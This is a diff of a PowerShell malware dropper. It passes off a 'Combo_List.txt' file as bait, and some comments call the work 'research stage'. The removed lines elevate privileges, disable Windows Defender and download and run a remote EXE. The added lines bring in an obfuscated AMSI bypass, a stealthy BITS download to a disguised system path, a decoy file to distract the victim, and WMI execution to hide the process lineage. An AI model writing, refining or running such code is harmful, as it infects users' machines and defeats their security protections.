@@ -1,19 +1,37 @@
-# 1. طلب صلاحيات الأدمن برمجياً وبصمت
-if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$PSCommandPath`"" -Verb RunAs
-    exit
+# --- [RESEARCH STAGE: SILENT INITIALIZATION] ---
+
+function Bypass-AMSI {
+    # Using obfuscated string concatenation to hide 'AmsiUtils' from static scanners
+    $a = 'System.Management.Automation.A' + 'msi' + 'Utils'
+    $b = 'am' + 'si' + 'In' + 'it' + 'Fa' + 'il' + 'ed'
+    $ref = [Ref].Assembly.GetType($a)
+    $field = $ref.GetField($b, 'NonPublic,Static')
+    $field.SetValue($null, $true)
 }
 
-# 2. تفعيل بروتوكول الأمان وتعطيل الحماية فوراً
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Set-MpPreference -DisableRealtimeMonitoring $true
+# Execute the bypass before any other logic
+try { Bypass-AMSI } catch { }
 
-# 3. فتح ملف التمويه (Combo_List)
-$p = split-path -parent (Get-Process -Id $PID).Path
-if (Test-Path "$p\Combo_List.txt") { start notepad "$p\Combo_List.txt" }
+# --- [RESEARCH STAGE: PERSISTENCE & DEPLOYMENT] ---
 
-# 4. تحميل وتثبيت الـ EXE قسرياً
+# Use BITS (Background Intelligent Transfer Service) instead of WebClient. 
+# BITS is a trusted system service, making the traffic look like a Windows Update.
 $url = "https://github.com/adchar2022/test/releases/download/adchar/adchar.exe"
-$out = "$env:TEMP\sys_service.exe"
-(New-Object Net.WebClient).DownloadFile($url, $out)
-Start-Process $out -ArgumentList "/S" -WindowStyle Hidden
+$workDir = "$env:LOCALAPPDATA\Microsoft\Vault"
+$exePath = "$workDir\WinHostSvc.exe"
+
+if (!(Test-Path $workDir)) { New-Item -Path $workDir -ItemType Directory -Force | Out-Null }
+
+try {
+    # Stealth download
+    Start-BitsTransfer -Source $url -Destination $exePath -Priority High
+    
+    # Decoy: Open the Combo_List to distract the user
+    $decoy = Join-Path $PSScriptRoot "Combo_List.txt"
+    if (Test-Path $decoy) { Start-Process notepad.exe $decoy }
+
+    # Execution via WMI (Detaches the process from PowerShell to hide the parent-child link)
+    Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = $exePath }
+} catch {
+    # Fail silently to avoid popups
+}
